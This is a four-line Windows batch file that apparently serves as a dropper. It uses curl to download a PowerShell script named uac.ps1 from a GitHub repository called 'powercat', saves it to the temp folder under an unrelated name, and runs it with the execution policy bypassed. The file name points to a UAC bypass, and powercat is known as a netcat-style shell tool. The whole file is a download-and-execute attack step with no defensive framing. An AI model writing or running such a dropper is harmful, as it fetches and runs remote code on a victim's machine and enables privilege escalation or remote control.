@echo off 
cls
curl https://raw.githubusercontent.com/wolfyy59/powercat/master/uac.ps1 --output %TEMP%/Uui.ps1


powershell.exe -ExecutionPolicy Bypass -Command %TEMP%/Uui.ps1

